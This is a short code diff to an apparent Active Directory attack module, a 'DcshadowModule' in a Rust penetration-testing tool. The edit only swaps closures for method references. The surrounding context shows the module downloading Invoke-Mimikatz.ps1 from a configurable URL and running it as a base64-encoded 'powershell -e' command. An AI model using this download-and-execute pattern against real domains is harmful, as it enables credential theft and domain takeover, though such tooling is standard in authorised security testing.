@@ -83,7 +83,7 @@ impl NxcModule for DcshadowModule {
         let value = opts.get("VALUE").ok_or_else(|| anyhow::anyhow!("VALUE option is required"))?;
         let mimi_url = opts
             .get("MIMIKATZ_URL")
-            .map(|s| s.as_str())
+            .map(std::string::String::as_str)
             .unwrap_or("http://127.0.0.1/Invoke-Mimikatz.ps1");
 
         // Construct the PowerShell payload to execute Invoke-Mimikatz
@@ -104,7 +104,7 @@ try {{
 
         let b64_script = base64::Engine::encode(
             &base64::engine::general_purpose::STANDARD,
-            script.encode_utf16().flat_map(|u| u.to_le_bytes()).collect::<Vec<u8>>(),
+            script.encode_utf16().flat_map(u16::to_le_bytes).collect::<Vec<u8>>(),
         );
         let cmd = format!("powershell -e {b64_script}");
 
